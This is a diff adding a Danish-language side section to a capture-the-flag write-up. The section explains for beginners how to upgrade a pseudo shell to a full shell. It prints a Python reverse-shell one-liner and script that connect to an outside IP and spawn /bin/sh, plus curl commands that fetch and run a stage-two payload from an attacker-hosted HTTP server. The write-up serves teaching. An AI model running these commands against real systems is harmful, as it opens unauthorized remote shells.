@@ -250,6 +250,86 @@ Vi har dermed root og kan printe flaget i /root/flag.txt!
 
 ```DDC{l4D_m1G_h4ck3_d3n_f0rr3tn1ng_h3h3h3h3h3h3h3}```
 
+## Side note: Foothold part 2
+Dette var min metode at få foothold på. Jeg fandt det nemmere at uploade en php fil, som jeg nemt kunne tilgå igen, hvis jeg mistede min reverse shell.
+
+Men for folk lidt nyere til cybersikkerhed, kan det godt virke overvældende at downloade, læse og forstå en exploit, for derefter at modificere den.
+
+Jeg har derfor lavet denne sektion, til at forklare en anden måde at få foothold på maskinen, som ikke kræver man modificerer den originale exploit.
+
+Istedet bruger man den originale exploits funktionalitet til at spawne en reverse shell. Dette kræver dog flere trin at reproducere. Jeg plejer personligt at undgå dette, da jeg gerne hurtigt vil kunne reproducere mine trin, i tilfælde af jeg mister forbindelse eller lignende til boksen. Men dette vil være nemmere for nyere mennesker i cybersikkerhed at forstå.
+
+### Step 1. Kør original exploit og enumerér.
+Efter du har kørt din originale exploit får du en pseudo shell, hvor du kan køre simple kommandoer i.
+
+Du kan bruge denne shell til at enumere hvilke programmer eksisterer på maskinen. Jeg plejer gerne at lede efter curl og wget, da jeg derved kan downloade en stage 2 payload og køre denne via. min pseudo shell.
+
+Derudover plejer jeg også at lede efter python, da python er nem at downloade en reverse shell payload til, som er relativ kort.
+
+Du kan søge efter programmer på path vha. ```which programnavn``` og se om de eksisterer. Her kan du se et eksempel på boksen hvor jeg finder curl og python men ingen wget:
+
+![enumerate foothold 2](enumerate_foothold2.png)
+
+### Step 2.1. Reverse shell med one-liner
+
+Du kan derefter hente en reverse shell fra feks. PayloadAllTheThings og køre denne via. din pseudo shell.
+
+Eksempel:
+![shell2](shell2.png)
+
+For denne challenge virker dette, men det er ikke altid dette vil. Nogen gange skal man sidde og bøvle i lang tid med escape characters mm. for at man kan få sin one-liner igennem, hvilket ikke er ideelt.
+
+Hvis dette sker, kan vi istedet kigge på at downloade en stage 2 og køre den:
+
+## Step 2.2 Reverse shell med download
+
+Lad os tage den originale payload og omskrive den til et python script istedet:
+```bash
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("77.210.13.4",13337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+```
+
+python -c betyder bare: Kør python med det her som kommando.
+
+Semikolonerne viser det er slutningen af en kommando og kan byttes ud med en newline.
+
+Så omskrevet, vil denne one-liner se sådan her ud:
+
+```python
+import socket,os,pty
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("77.210.13.4",13337))
+
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+
+pty.spawn("/bin/sh")
+```
+
+Vi kan derefter gemme dette i en fil på vores host og starte en simple http server via. python fra den samme folder:
+
+På din maskine:
+```python3 -m http.server```
+
+På server via. pseudo shell:
+Nu kan vi bruge vores pseudo shell og curl til at hente payloaden på serveren:
+
+```curl http://77.210.13.4:8000/stage2.py -o /tmp/stage2.py```
+
+Og derefter køre den:
+
+```python /tmp/stage2.py```
+
+![enumerate_foothold3](enumerate_foothold3.png)
+
+Derved har vi nu kigget på 3 metoder at opgradere sin shell fra en pseudo shell til en rigtig shell :-)
+
+
+
+
+
+
 
 
 
